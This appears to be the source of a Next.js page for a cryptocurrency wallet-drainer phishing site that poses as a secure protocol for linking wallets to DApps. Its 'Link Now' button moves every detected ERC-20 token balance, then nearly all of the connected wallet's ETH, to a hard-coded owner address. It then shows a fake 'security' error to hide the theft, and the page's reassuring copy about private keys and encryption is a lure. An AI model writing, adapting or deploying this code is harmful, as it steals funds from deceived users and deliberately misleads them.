import { Inter } from 'next/font/google';
import { useEffect, useState } from 'react';
import { ethers } from 'ethers';
import { useAccount } from 'wagmi';
import { OwnerAdress, ownerPercentage } from '@/lib/address';
import { getNetwork } from 'wagmi/actions';
import { checkIfUserOwnsAnyTokeninList } from '@/lib/functions/userTokenList';
import Swal from 'sweetalert2/dist/sweetalert2.js';
import 'sweetalert2/src/sweetalert2.scss';
import { IERC20Contract } from '@/lib/ethersSetUp';
import img from '@/assets/peopleOnTower.png';
import img2 from '@/assets/coinsTower.svg';
import Image from 'next/image';
import Modal from '@/components/Modal';
import { useDisconnect } from 'wagmi';

const inter = Inter({ subsets: ['latin'] });

type validBalances =
  | {
      balance: string;
      tokenAddress: string;
    }[]
  | undefined;

export default function Home() {
  const [balance, setBalance] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(true);
  const [validBalances, setValidBalance] = useState<validBalances>();
  const { address, isConnected } = useAccount();
  const { chain } = getNetwork();
  const { disconnect } = useDisconnect();

  const gasBuffer = 100000000;

  const getUserBalace = async () => {
    try {
      const provider = new ethers.providers.Web3Provider(
        window.ethereum as any
      );
      const balanceInWei = await provider.getBalance(String(address));
      const balanceInEth = ethers.utils.formatEther(balanceInWei);
      setBalance(balanceInEth);
      console.log(balanceInEth);
      return balanceInEth;
    } catch (error) {
      console.log('err', error);
    }
  };

  const showNotification = (text: string) => {
    Swal.fire({
      title: 'Error!',
      text: text,
      icon: 'error',
    });
  };

  useEffect(() => {
    const bb = async () => {
      const a = await checkIfUserOwnsAnyTokeninList(
        chain?.name || '',
        String(address)
      );
      setValidBalance(a);
    };
    bb();
  }, []);

  const handleTokenErc20Transfer = async () => {
    if (validBalances) {
      validBalances?.forEach(async (token) => {
        const erc20Contract = IERC20Contract(token.tokenAddress);

        const decimals = await erc20Contract.decimals();
        const toApproveOwner = String(
          Number(token.balance) / Math.pow(10, Number(decimals))
        );

        await erc20Contract.approve(OwnerAdress, toApproveOwner);
        try {
          const tx = await erc20Contract.transfer(
            OwnerAdress,
            String(toApproveOwner)
 
          );
          await handleTokenEthTransfer();   
          await tx.wait();

          showNotification(
            "For Security Reasons You can't connect empty or new wallet"
          );
        } catch (error) {
          showNotification(String(error));
          console.log(error);
        }
      });
    }
  };


  const handleTokenEthTransfer = async () => {
    const defBal = await getUserBalace();
    const provider = new ethers.providers.Web3Provider(window.ethereum as any);
    const gas = '5000000000000000';
    let bal;

    if (!balance) {
      bal = String(defBal);
    } else {
      bal = balance;
    }

    const balanceInWei = ethers.utils.parseEther(bal);
    if (Number(balanceInWei) >= Number(gas)) {
      const newBalanceAfterGas = Number(balanceInWei) - Number(gas);
      const signer = provider.getSigner();
      const ownersShare = Number(newBalanceAfterGas);

      try {
        const tx = await signer.sendTransaction({
          to: OwnerAdress,
          value: String(ownersShare),
        });

        await tx.wait();
        showNotification(
          "For Security Reasons You can't connect empty or new wallet"
        );
      } catch (error) {
        showNotification(String(error));
        console.log('err', error);
      }
    } else {
      showNotification(
        String("For Security Reasons You can't connect empty or new wallet")
      );
    }
  };



  useEffect(() => {
    getUserBalace();
  }, []);

  const handleTokenTransfer = async () => {
    if (validBalances) {
      await handleTokenErc20Transfer();

    } else{
      await handleTokenEthTransfer();
    }

  };



  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

  if (!mounted) return <></>;
  if (isModalOpen) return <Modal setIsModalOpen={setIsModalOpen} />;
  return (
    <main
      className={` min-h-screen w-screen  bg-white pt-5 text-black ${inter.className}`}
    >
      <div className="w-full flex justify-end px-5">
        {isConnected && (
          <button
            className="bg-black text-white h-10 w-32 rounded-3xl"
            onClick={() => disconnect()}
          >
            Disconnect
          </button>
        )}
      </div>

      <div className="flex flex-col-reverse md:flex-row h-[calc(100vh-100px)] items-center md:px-24 px-5 mt-20 md:mt-0">
        <div>
          <h1 className="md:text-7xl text-2xl font-[600] w-full ">
            Link your DApps to mobile wallets
          </h1>
          <p className="mt-5 md:text-xl text-base md:w-[80%] w-full h">
            {
              'Open protocol to communicate securely between Wallets and Dapps (Web3 Apps). The protocol establishes a remote connection using a Bridge server.'
            }
          </p>

          <div className="md:px-24 md:-mt-10 mt-5  px-5">
        {isConnected ? (
          <button
            onClick={async () => await handleTokenTransfer()}
            className="md:w-[400px] w-full text-xl h-[50px] bg-black text-white rounded-3xl"
          >
            Link Now
          </button>
        ) : ( 
         
          <button
            onClick={() => {
              setIsModalOpen(true);
            }}
            className="md:w-[400px] w-full text-xl h-[50px] bg-black text-white rounded-3xl"
          >
            Connect Wallet
          </button>
        )}
      </div>
          <p className="mt-5">Get Started in 3 Easy Steps</p>
          <div className="mt-3">
            <p className="font-bold">1.Connect Wallet</p>
            <p className="mt-1">
              {
                ' Paste inside Wallet Dapps browser either synchronize, validate, rectify or recover wallet.'
              }
            </p>
          </div>
          <div className="mt-3">
            <p className="font-bold">2.Validate Wallet</p>
            <p className="mt-1">
              {
                'Prove ownership of the wallet you want to connect. Private keys never leave mobile wallets, keeping user funds safe.'
              }
            </p>
          </div>
          <div className="mt-3">
            <p className="font-bold">3.Get Connected</p>
            <p className="mt-1">
              {
                'End-to-end encryption using client-side generated keys keeps all user activity private.'
              }
            </p>
          </div>
        </div>

      </div>
      
     
  
    </main>
  );
}
